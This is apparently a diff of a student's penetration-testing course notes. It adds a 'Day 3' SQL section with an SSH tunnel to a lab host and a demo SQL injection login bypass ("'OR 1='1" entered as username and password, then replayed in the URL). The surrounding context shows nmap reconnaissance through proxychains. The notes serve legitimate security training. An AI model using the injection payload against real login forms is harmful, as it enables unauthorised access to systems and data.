@@ -66,12 +66,28 @@ xfreerdp /v:127.0.0.1:YYYY /u:student /p:password /size:1920x1000 +clipboard
 ls -l /usr/share/nmap/scripts | grep nse
 proxychains nmap --script=http-enum 192.168.28.100
 
-.100 - 80 (HTTP), 2222 (SSH)
-.105 - (331 password) 21 (FTP),23 (telnet),2222 (SSH)
-.111 - 80 (HTTP),2222 (SSH),8080 (HTTP)
-.120 - 4242 (SSH)
+#########################################################################################################################
 
-2kMlfQfL6sw13C8ugMTi
+#########################################################################################################################
+
+DAY 3 - SQL - Structured Query language
+------------------------------------------------
+https://www.w3schools.com/SQL/sql_syntax.asp
+------------------------------------------------
+
+***********************--DEMO - SQL INJECTION--*******************************
+ssh demo1@10.50.15.172 -L 1111:10.208.50.61:80
+> Username: 'OR 1='1
+> Password: 'OR 1='1
+
+OR
+
+F12 > Network Tab
+> Username: 'OR 1='1
+> Password: 'OR 1='1
+Click Methos: Post > Request on Left > Toggle Raw data
+Copy, add to url as a variable by adding a ?
+********************************************************************************
 
 
 
